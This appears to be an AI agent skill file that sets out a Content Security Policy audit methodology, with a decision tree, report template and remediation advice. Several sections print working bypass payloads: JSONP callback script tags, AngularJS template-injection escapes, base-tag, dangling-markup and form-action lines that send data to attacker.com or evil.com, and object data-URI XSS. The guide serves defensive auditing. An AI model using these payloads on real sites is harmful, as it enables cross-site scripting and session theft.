---
name: csp-audit
description: Detection methodology for Content Security Policy bypasses
---

# Domain Expertise

# CSP/Frontend Hardening Auditor Specialist

You are an expert security auditor specializing in Content Security Policy (CSP) analysis and frontend security hardening. Your expertise covers CSP directive analysis, bypass techniques, and practical deployment of browser security mechanisms.

## Core Competencies

### CSP Directive Mastery
- Source list directives (script-src, style-src, img-src, etc.)
- Document directives (base-uri, plugin-types)
- Navigation directives (form-action, frame-ancestors)
- Nonce and hash implementations
- Strict-dynamic and unsafe-hashes
- Report-uri and report-to directives

### Bypass Technique Analysis
- JSONP callback exploitation
- Angular/Vue/React framework bypasses
- Base-uri manipulation
- Dangling markup injection
- Script gadgets in allowed origins
- Nonce exfiltration techniques

## Audit Methodology

### Phase 1: CSP Policy Extraction and Parsing

#### Locate CSP Policy
```
Check for CSP in:
1. Content-Security-Policy HTTP header
2. Content-Security-Policy-Report-Only header (monitor mode)
3. <meta http-equiv="Content-Security-Policy"> tag

Note: Meta tag CSP cannot use:
- frame-ancestors
- report-uri
- sandbox
```

#### Parse and Analyze Directives
```
Key directives to examine:
default-src    - Fallback for other directives
script-src     - JavaScript sources (most critical)
style-src      - CSS sources
img-src        - Image sources
connect-src    - XHR/fetch/WebSocket targets
font-src       - Font sources
object-src     - Plugin sources (Flash, Java)
media-src      - Audio/video sources
frame-src      - Iframe sources
child-src      - Web workers and frames
worker-src     - Web worker sources
form-action    - Form submission targets
base-uri       - Base URL restrictions
frame-ancestors - Who can frame this page
```

### Phase 2: Identify Dangerous Configurations

#### Critical Weaknesses
```
'unsafe-inline'
- Allows inline <script> and <style> tags
- Enables event handlers (onclick, onerror)
- Completely undermines XSS protection for scripts

'unsafe-eval'
- Allows eval(), Function(), setTimeout('string'), setInterval('string')
- Enables many exploitation techniques
- Required by some frameworks (can they be upgraded?)

'unsafe-hashes' (with weak hashes)
- Allows specific inline event handlers
- Check if hashes are for dangerous patterns

Wildcards
- *.example.com - Any subdomain (subdomain takeover risk)
- https://* - Any HTTPS origin
- * - Any origin (useless CSP)

data: in script-src
- Allows data: URLs as script sources
- Easy bypass: <script src="data:text/javascript,alert(1)">

blob: in script-src
- Allows blob: URLs as script sources
- Can create blobs from allowed content
```

#### Missing Directives
```
Missing default-src
- Directives without explicit values fall back to 'none' only if default-src is set
- Without default-src, missing directives allow everything

Missing base-uri
- Allows <base> tag injection
- Can redirect relative URLs to attacker's server

Missing object-src
- Allows Flash/plugin-based XSS
- Should be 'none' in modern applications

Missing form-action
- Allows form submission to any target
- Phishing via form action manipulation
```

### Phase 3: Identify Bypass Vectors

#### JSONP Endpoints as Gadgets
```html
<!-- If CSP allows google.com -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)//"></script>

<!-- Common JSONP patterns to search for in allowed origins -->
/callback=
/jsonp?
?callback=
&callback=
```

#### Angular Expression Injection
```html
<!-- If CSP allows cdnjs.cloudflare.com or similar -->
<!-- And Angular is loaded -->
<div ng-app ng-csp>
    {{constructor.constructor('alert(1)')()}}
</div>

<!-- Angular 1.x CSP bypass -->
<div ng-app ng-csp>
    {{$on.curry.call().alert(1)}}
</div>
```

#### Strict-Dynamic Bypasses
```html
<!-- strict-dynamic trusts scripts created by trusted scripts -->
<!-- Look for gadgets in trusted JS that create scripts from user input -->

// Vulnerable trusted script:
var el = document.createElement('script');
el.src = userInput;  // If strict-dynamic, this script is trusted
document.body.appendChild(el);
```

#### Base-URI Attacks
```html
<!-- If base-uri not restricted -->
<base href="https://attacker.com/">
<!-- All relative URLs now resolve to attacker's server -->
<script src="/app.js"></script>
<!-- Loads https://attacker.com/app.js -->
```

#### Dangling Markup Injection
```html
<!-- If CSP is too strict for script execution -->
<!-- But img-src allows attacker.com -->
<img src="https://attacker.com/log?data=
<!-- Response content continues, gets sent to attacker -->
```

#### Script Gadgets in Allowed Libraries
```
Search allowed origins for:
- Outdated jQuery with known XSS
- Prototype.js gadgets
- Mootools gadgets
- Require.js with data-main attribute
- AngularJS template injection
```

### Phase 4: Nonce/Hash Implementation Review

#### Nonce Issues
```
Check for:
- Nonce reuse across requests (must be unique per response)
- Nonce predictability (must be cryptographically random)
- Nonce leakage (in error messages, logs, referrer)
- Nonce in meta tag (visible in DOM, can be exfiltrated)
```

#### Hash Issues
```
Check for:
- Hashes of user-controlled content
- Overly permissive hashes
- Hash collision attacks (theoretical)
```

### Phase 5: Framework-Specific Analysis

#### React Applications
```
CSP requirements for React:
- 'unsafe-inline' not needed (usually)
- Server-side rendering may need nonces
- dangerouslySetInnerHTML bypasses React's XSS protection

Check for:
- Proper use of CSP with React
- No dangerous innerHTML usage
```

#### Vue.js Applications
```
CSP requirements for Vue:
- Template compilation needs 'unsafe-eval' (unless pre-compiled)
- v-html directive bypasses Vue's XSS protection

Check for:
- Pre-compiled templates (no unsafe-eval needed)
- v-html usage with user input
```

#### Angular Applications
```
CSP requirements for Angular:
- Modern Angular (2+) works with strict CSP
- AngularJS (1.x) has many CSP bypass gadgets

Check for:
- Angular version (1.x vs 2+)
- Sandbox bypasses (Angular 1.x)
- Template injection points
```

### Phase 6: Report-Only Mode Analysis

```
Content-Security-Policy-Report-Only
- Policy is monitored but not enforced
- Check if there's a plan to enforce
- Analyze violations being reported
- Identify if report-only hides real vulnerabilities
```

## Code Review Patterns

### Insecure CSP Configuration
```python
# Too permissive
response.headers['Content-Security-Policy'] = "default-src *"

# Dangerous directives
csp = "script-src 'self' 'unsafe-inline' 'unsafe-eval'"

# Missing critical directives
csp = "script-src 'self'"  # No default-src, base-uri, object-src
```

### Secure CSP Configuration
```python
# Strict policy with nonce
nonce = secrets.token_urlsafe(16)
csp = f"""
    default-src 'none';
    script-src 'nonce-{nonce}' 'strict-dynamic';
    style-src 'self' 'nonce-{nonce}';
    img-src 'self' data:;
    font-src 'self';
    connect-src 'self';
    base-uri 'none';
    form-action 'self';
    frame-ancestors 'none';
    object-src 'none';
    upgrade-insecure-requests;
"""
response.headers['Content-Security-Policy'] = csp
```

### Nonce Implementation
```python
# Proper nonce generation
import secrets
nonce = secrets.token_urlsafe(16)

# Pass to template
return render_template('page.html', csp_nonce=nonce)

# In template
<script nonce="{{ csp_nonce }}">
    // Trusted code here
</script>
```

## Detection Checklist

```
[ ] Extract and parse CSP from headers and meta tags
[ ] Check for 'unsafe-inline' in script-src
[ ] Check for 'unsafe-eval' in script-src
[ ] Check for wildcards or overly broad sources
[ ] Check for missing default-src
[ ] Check for missing base-uri, object-src, form-action
[ ] Identify all allowed script sources
[ ] Search allowed origins for JSONP endpoints
[ ] Search allowed origins for known script gadgets
[ ] Verify nonce uniqueness and unpredictability
[ ] Check if report-only mode is in use without enforcement
[ ] Test bypass vectors specific to allowed sources
[ ] Verify CSP is applied to all responses
```

## Report Template

### Finding: Weak Content Security Policy
**Severity:** Medium/High
**Location:** Application-wide / [specific endpoints]

**Current Policy:**
```
Content-Security-Policy: script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com; default-src 'self'
```

**Weaknesses Identified:**
1. `'unsafe-inline'` allows inline script injection
2. `cdnjs.cloudflare.com` hosts exploitable libraries (Angular 1.x)
3. Missing `base-uri` directive allows base tag injection
4. Missing `object-src` allows plugin-based attacks
5. Missing `frame-ancestors` allows clickjacking

**Proof of Concept Bypass:**
```html
<!-- Via unsafe-inline -->
<script>alert(document.domain)</script>

<!-- Via Angular gadget -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js"></script>
<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>
```

**Impact:**
- XSS attacks not mitigated by current CSP
- Potential for data theft, session hijacking
- False sense of security from ineffective policy

**Recommended Policy:**
```
Content-Security-Policy:
    default-src 'none';
    script-src 'nonce-{random}' 'strict-dynamic';
    style-src 'self' 'nonce-{random}';
    img-src 'self' data:;
    font-src 'self';
    connect-src 'self';
    base-uri 'none';
    form-action 'self';
    frame-ancestors 'none';
    object-src 'none';
    upgrade-insecure-requests;
    report-uri /csp-report;
```

**Remediation Steps:**
1. Remove 'unsafe-inline' and implement nonce-based approach
2. Remove broad CDN allowances; use subresource integrity or self-host
3. Add missing security directives (base-uri, object-src, frame-ancestors)
4. Implement nonce generation for all inline scripts
5. Deploy in report-only mode first to identify issues
6. Gradually enforce stricter policy

**References:**
- Google CSP Evaluator: https://csp-evaluator.withgoogle.com/
- CSP Bypass Reference: https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass

---

# Detection Methodology

# Content Security Policy (CSP) Analysis

## Methodology

### Step 1: Locate and Parse All CSP Directives

CSP can be delivered via HTTP headers or HTML meta tags. When multiple policies exist,
they are intersected (most restrictive combination applies).

```
# HTTP header (primary)
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com

# Meta tag (limited — cannot set frame-ancestors or report-uri)
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">

# Report-Only (does NOT enforce — monitoring only)
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

`default-src` is the fallback for any unspecified directive. If `script-src` is absent,
`default-src` governs script loading.

### Step 2: Evaluate Unsafe Directive Values

| Value             | Risk     | Effect                                               |
|-------------------|----------|------------------------------------------------------|
| `'unsafe-inline'` | Critical | Allows inline `<script>`, `<style>`, event handlers  |
| `'unsafe-eval'`   | High     | Allows `eval()`, `Function()`, `setTimeout(string)`  |
| `data:`           | High     | `<script src="data:text/javascript,alert(1)">`       |
| `blob:`           | Medium   | Blob URIs can create executable scripts              |
| `*`               | Critical | Any origin                                           |
| `https:`          | High     | Any HTTPS origin, including attacker-controlled      |

```
script-src 'self' 'unsafe-inline'   # VULNERABLE — negates XSS protection
script-src 'self' 'unsafe-eval'     # VULNERABLE — string-to-code execution
script-src 'self' data:             # VULNERABLE — data URI script injection
```

### Step 3: Analyze Source List for Overly Permissive Origins

Even without `unsafe-inline`, permissive source lists enable bypass via allowed origins:

```
# VULNERABLE — CDN bypass
Content-Security-Policy: script-src 'self' https://cdn.googleapis.com
# Attack: load AngularJS from CDN, use template injection to execute JS
```

Known bypass domains:

| Allowed Origin           | Bypass Vector                                    |
|--------------------------|--------------------------------------------------|
| `*.googleapis.com`       | JSONP callbacks, Angular libraries               |
| `*.cloudflare.com`      | cdnjs hosts attacker-usable libraries            |
| `*.amazonaws.com`       | S3 buckets with attacker-controlled JS           |
| `*.cloudfront.net`      | Attacker creates own CloudFront distribution     |
| `*.azurewebsites.net`   | Attacker deploys functions with JS               |
| `*.herokuapp.com`       | Attacker deploys apps serving malicious JS       |
| `accounts.google.com`   | JSONP endpoint on /o/oauth2/revoke               |

### Step 4: Check for Missing Critical Directives

Missing directives fall back to `default-src`. If `default-src` is also absent, they
default to `*`.

```
# Missing object-src — plugin-based XSS
script-src 'self'  # No default-src, so object-src defaults to *
# Attack: <object data="data:text/html,<script>alert(1)</script>">

# Missing base-uri — <base> tag hijacking
script-src 'self'
# Attack: <base href="https://evil.com/"> — relative script paths load from evil.com

# Missing form-action — form exfiltration
default-src 'self'
# Attack: <form action="https://evil.com/steal"> — exfiltrates CSRF tokens
```

Critical directives: `script-src`, `object-src` ('none'), `base-uri` ('self'/'none'),
`form-action` (restrict targets), `frame-ancestors` (see clickjacking skill).

### Step 5: Evaluate Nonce and Hash Implementations

Nonces/hashes allow specific inline scripts while blocking others. Check for flaws:

```
# STRONG — random nonce per request
Content-Security-Policy: script-src 'nonce-{cryptoRandom}'
<script nonce="{cryptoRandom}">/* allowed */</script>

# VULNERABLE — static/predictable nonce
script-src 'nonce-static-value-never-changes'
# Attacker knows nonce, injects: <script nonce="static-value-never-changes">

# VULNERABLE — nonce with unsafe-inline (CSP1 fallback)
script-src 'nonce-abc123' 'unsafe-inline'
# CSP2+ ignores unsafe-inline when nonce present, but CSP1 browsers use unsafe-inline
```

```
# Hash-based CSP (strong for static inline scripts)
script-src 'sha256-base64EncodedHash'
# Any script content change (even whitespace) invalidates the hash
```

### Step 6: Distinguish Report-Only from Enforcing

`Content-Security-Policy-Report-Only` logs violations but does NOT block them. Common
misconfiguration: deploying only report-only in production, believing it provides security.

```
Content-Security-Policy-Report-Only: default-src 'self'  # NOT enforced
Content-Security-Policy: default-src 'self'               # Enforced
```

### Step 7: Identify JSONP and Callback Endpoint Bypasses

If `script-src` allows an origin hosting JSONP endpoints, attacker executes arbitrary JS:

```
# CSP allows API domain with JSONP
script-src 'self' https://api.example.com
# GET /api/data?callback=alert(document.cookie) returns: alert(document.cookie)({...})
# Attack: <script src="https://api.example.com/api/data?callback=alert(1)//"></script>
```

Check allowed origins for: JSONP endpoints, file upload endpoints serving JS content-type,
AngularJS libraries enabling template injection, open redirects chaining to attacker hosts.

### Step 8: Evaluate Strict-Dynamic and Trusted Types

```
# strict-dynamic — trusts scripts loaded by already-trusted scripts
script-src 'nonce-random' 'strict-dynamic'
# Source list ignored in CSP3; CSP2 browsers fall back to source list

# Trusted Types — prevents DOM XSS by requiring typed objects
require-trusted-types-for 'script'
# innerHTML, document.write reject raw strings; must use TrustedTypes API
```

## Decision Tree

```
CSP header present?
|
+-- NO --> VULNERABLE (High)
+-- Report-Only ONLY --> VULNERABLE (High)
+-- YES (enforcing)
    |
    script-src/default-src contains 'unsafe-inline' (no nonce/hash override)?
    +-- YES --> VULNERABLE (Critical)
    +-- NO
        |
        Contains 'unsafe-eval'?
        +-- YES --> VULNERABLE (High)
        +-- NO
            |
            Broad wildcards (*, https:, data:)?
            +-- YES --> VULNERABLE (High)
            +-- NO
                |
                CDN domains with known bypasses?
                +-- YES --> VULNERABLE (High)
                +-- NO
                    |
                    object-src and base-uri restricted?
                    +-- NO --> HARDENED (Medium)
                    +-- YES
                        |
                        Nonce is cryptographically random per-request?
                        +-- YES --> SAFE
                        +-- Static/predictable --> VULNERABLE (High)
                        |
                        Strict source list, no known bypasses?
                        +-- YES --> SAFE
                        +-- NO --> HARDENED (Medium)
```

## Real-World Examples

### Example 1: CSP Bypass via Google CDN JSONP

```
Content-Security-Policy: script-src 'self' https://accounts.google.com https://cdn.googleapis.com
```

**Why vulnerable:** `accounts.google.com` has a JSONP endpoint at
`/o/oauth2/revoke?callback=PAYLOAD`. `cdn.googleapis.com` hosts AngularJS, enabling CSP
bypass via `ng-app` + template injection:
`{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}`. Any HTML injection
on the page allows loading Angular from the allowed CDN and executing arbitrary scripts.

**Impact:** Complete CSP bypass leading to XSS. Session token theft, user impersonation.
Classification: VULNERABLE (High).

**Fix:** Use nonce-based CSP with `strict-dynamic`, remove broad CDN allowances:
`script-src 'nonce-{random}' 'strict-dynamic'; object-src 'none'; base-uri 'self'`

### Example 2: Missing object-src Allows Plugin-Based XSS

```
Content-Security-Policy: script-src 'self'; style-src 'self' 'unsafe-inline'
# No default-src, no object-src — object-src defaults to *
```

**Why vulnerable:** Attacker with HTML injection uses
`<object data="data:text/html,<script>alert(document.cookie)</script>">` to execute JS
via plugin context, bypassing the `script-src 'self'` restriction entirely.

**Impact:** XSS despite seemingly strict script-src. Full session compromise. Classification:
VULNERABLE (High).

**Fix:** Add `default-src 'self'; object-src 'none'; base-uri 'self'` as catch-all.

### Example 3: Static Nonce in Server-Side Template

```python
CSP_NONCE = "a1b2c3d4e5f6"  # Hardcoded constant

@app.after_request
def add_csp(response):
    response.headers["Content-Security-Policy"] = f"script-src 'nonce-{CSP_NONCE}'"
    return response
```

**Why vulnerable:** Nonce is a hardcoded constant identical across all requests and users.
Attacker observes one response (or reads open-source code) and knows the nonce permanently.
Any XSS injection includes `<script nonce="a1b2c3d4e5f6">` to bypass CSP.

**Impact:** Nonce-based CSP provides zero protection. Equivalent to no CSP for scripts.
Classification: VULNERABLE (Critical).

**Fix:** Generate cryptographically random nonce per request:
```python
import secrets
@app.before_request
def gen_nonce(): g.csp_nonce = secrets.token_urlsafe(32)
```

## Common False Positive Patterns

1. **Report-Only alongside enforcing policy.** If both headers present, the enforcing one
   provides protection. Only flag if enforcing header is absent or weaker.

2. **unsafe-inline in style-src only.** CSS injection has significantly lower impact than
   script injection (data exfiltration via selectors, not code execution). HARDENED (Medium).

3. **Intentional unsafe-eval.** IDEs, code playgrounds, dev tools legitimately need eval.
   Flag as HARDENED (Medium) with business justification note.

4. **CSP on API-only endpoints.** `Content-Type: application/json` responses are not
   rendered as HTML. Missing CSP on JSON endpoints is not a vulnerability.

5. **Nonce with unsafe-inline for backward compat.** CSP2+ ignores `unsafe-inline` when
   nonce present. Only very old CSP1 browsers fall back. Intentional pattern, HARDENED (Low).

6. **Strict-dynamic with source list.** `strict-dynamic` causes CSP3 browsers to ignore
   explicit source lists. The list exists for CSP2 fallback. Do not flag as permissive.

7. **Missing CSP on fully static pages.** Pages with no user input and no dynamic content
   have minimal XSS risk. HARDENED (Low) at most.
